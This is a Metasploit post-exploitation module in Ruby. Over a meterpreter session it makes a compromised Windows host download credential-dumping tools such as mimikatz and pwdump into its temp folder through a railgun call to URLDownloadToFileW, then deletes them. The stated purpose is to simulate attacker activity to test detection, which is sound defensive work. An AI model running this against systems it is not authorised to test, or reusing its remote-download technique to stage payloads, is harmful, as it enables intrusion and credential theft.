##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

  def initialize(info={})
    super(update_info(info,
      'Name'                 => "Windows Simulate Evil Utility Download",
      'Description'          => %q{
        This module will attempt to download a list of suspicious files to %TEMP% 
	by importing urlmon via railgun. The files will not execute. The intent 
	is to simulate malicious activity in order to test operational security 
        detection capabilities. Based on post/windows/manage/download_exec.rb
      },
      'License'              => MSF_LICENSE,
      'Platform'             => ['win'],
      'SessionTypes'         => ['meterpreter'],
      'Author'               => ['RST']
    ))

    register_options(
      [
        OptString.new('URLS',          [true, 'Comma-separated list of full URL of file to download',
                                        "http://blog.gentilkiwi.com/downloads/mimikatz_trunk.zip," +
					"http://www.tarasco.org/security/pwdump_7/pwdump7.zip," + 
					"https://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe," +
					"http://www.openwall.com/john/h/john179w2.zip" ]),
        OptBool.new(  'DELETE',        [true, 'Delete file after download', true ]),
	OptInt.new(   'SLEEP',         [true, 'Sleep time in seconds prior to delete', 3]),
      ], self.class)

  end

  # Check to see if our dll is loaded, load and configure if not
  def add_railgun_urlmon

    if client.railgun.dlls.find_all {|d| d.first == 'urlmon'}.empty?
      session.railgun.add_dll('urlmon','urlmon')
      session.railgun.add_function(
        'urlmon', 'URLDownloadToFileW', 'DWORD',
          [
            ['PBLOB', 'pCaller', 'in'],
            ['PWCHAR','szURL','in'],
            ['PWCHAR','szFileName','in'],
            ['DWORD','dwReserved','in'],
            ['PBLOB','lpfnCB','inout']
      ])
      vprint_good("urlmon loaded and configured")
    else
      vprint_status("urlmon already loaded")
    end

  end

  def run

    # Make sure we meet the requirements before running the script, note no need to return
    # unless error
    return 0 if session.type != "meterpreter"

    # get time
    strtime = Time.now

    # set up railgun
    add_railgun_urlmon

    # check/set vars
    path = session.sys.config.getenv('TEMP')
    remove = datastore['DELETE']
    urls = []
    urls = datastore["URLS"].split(",")

    #TODO> check if URLs are empty / valid looking

    for url in urls

      filename = url.split('/').last
      outpath = path + '\\' + filename

      # get our file
      vprint_status("Downloading #{url} to #{outpath}")
      client.railgun.urlmon.URLDownloadToFileW(nil,url,outpath,0,nil)

      # check our results
      begin
        out = session.fs.file.stat(outpath)
        print_status("#{out.stathash['st_size']} bytes downloaded to #{outpath} in #{(Time.now - strtime).to_i} seconds ")
      rescue
        print_error("File not found. The download probably failed")
      end

      # remove file if needed
      if remove
        begin
          print_status("Sleeping #{datastore['SLEEP']} seconds just in case...")
          sleep datastore['SLEEP']
          print_status("Deleting #{outpath}")
          session.fs.file.rm(outpath)
        rescue ::Exception => e
          print_error("Unable to remove file: #{e.message}")
        end
      end
    end
  end
end
